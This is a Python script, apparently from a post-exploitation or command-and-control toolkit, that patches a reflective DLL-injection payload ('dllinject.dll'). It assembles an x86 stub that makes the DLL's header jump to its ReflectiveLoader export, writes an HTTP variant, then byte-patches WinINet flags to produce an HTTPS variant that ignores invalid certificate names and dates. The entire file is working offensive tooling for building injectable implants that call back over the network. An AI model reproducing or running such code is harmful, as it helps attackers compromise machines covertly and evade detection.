from keystone import *
from sys import stdout
import pefile
import os
import shutil

print("[*] Loading DLLINJECT.DLL...")
# Load Dllinject.dll
module_dir = os.path.dirname(__file__)
payloads_dir = os.path.join(module_dir, "payloads")
dllpath = os.path.join(payloads_dir, "binaries", "dllinject.dll")
dll = pefile.PE(dllpath)

# Get FileOffset of ReflectiveLoader function address
exportdir = dll.DIRECTORY_ENTRY_EXPORT
ref_loader_ofs = 0
for n in exportdir.symbols:
    if n.name == b"ReflectiveLoader":
        ref_loader_ofs = dll.get_offset_from_rva(n.address)
        break
print("[*] Found ReflectiveLoader function at FileOffset {0}".format(hex(ref_loader_ofs)))

# Read Offset to PESig (e_lfanew)
with open(dllpath, "rb") as dllinject:
    dllinject.seek(0x3C)
    e_lfanew = dllinject.read(4)
    dllinject.seek(0x40)
    _headers = dllinject.read(0x3C0)
    print("[*] Calculating new Offset for PE header...")

# Reflective Loader
ref_loader = '''
    dec ebp
    pop edx
    call this
this:
    pop ebx
    push edx
    inc ebp
    push ebp
    mov ebp, esp
    add ebx, {0}h
    call ebx
    add ebx, 262A3h
    mov [ebx], edi
    push 4
    push eax
    call eax
'''.format(hex(ref_loader_ofs-7).replace("0x",""))
ks = Ks(KS_ARCH_X86, KS_MODE_32)
enc, cnt = ks.asm(ref_loader)
# Add Zero padding
zero_pad = [0 for n in range(0x1A)]

# assemble reflective loader header
ref_header = enc + zero_pad + [n for n in e_lfanew] + [n for n in _headers]
print("[*] Assembled reflective loader code for MZ stub")

# Read data per section
print("[*] Calculating offsets for each section...")
for idx, section in enumerate(dll.sections):
    d = section.get_data()
    ref_header+=d

# Write the re-assembled Dllinject.dll
print("[*] Patching DLLINJECT.DLL for HTTP connection...")
with open(os.path.join(payloads_dir, "binaries", "patched_dllinject_http.dll"), "wb") as p:
    p.write(bytes(ref_header))

# for HTTPS connection
# Enable INTERNET_FLAG_SECURE bit on InternetSetOptions
print("[*] Patching DLLINJECT.DLL for HTTPS connection...")
with open(os.path.join(payloads_dir, "binaries", "patched_dllinject_http.dll"), "rb") as p:
    d = p.read()

# Search for 84680200h ;HTTP_OPEN_FLAGS
# ;(0x80000000 | # INTERNET_FLAG_RELOAD
# ; 0x04000000 | # INTERNET_NO_CACHE_WRITE
# ; 0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
# ; 0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
# ; 0x00080000 | # INTERNET_FLAG_NO_COOKIES
# ; 0x00000200 ) # INTERNET_FLAG_NO_UI
pos = -1
pos = d.find(b"\x00\x02\x68\x84")
if pos < 0:
    print("No patching needed for HTTPS")
else:
    # Replace it with 84E83200h ;HTTP_OPEN_FLAGS
    # ;(0x80000000 | # INTERNET_FLAG_RELOAD
    # ; 0x04000000 | # INTERNET_NO_CACHE_WRITE
    # ; 0x00800000 | # INTERNET_FLAG_SECURE
    # ; 0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
    # ; 0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
    # ; 0x00080000 | # INTERNET_FLAG_NO_COOKIES
    # ; 0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
    # ; 0x00001000 | # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
    # ; 0x00000200 ) # INTERNET_FLAG_NO_UI
    d = list(d)
    d[pos] = 0
    d[pos+1] = int("32", 16)
    d[pos+2] = int("E8", 16)
    d[pos+3] = int("84", 16)
    with open(os.path.join(payloads_dir, "binaries", "patched_dllinject_https.dll"), "wb") as p:
        p.write(bytes(d))
        print("[*] Patched at offset 0x{0:08X}".format(pos))

print("[*] Done.")
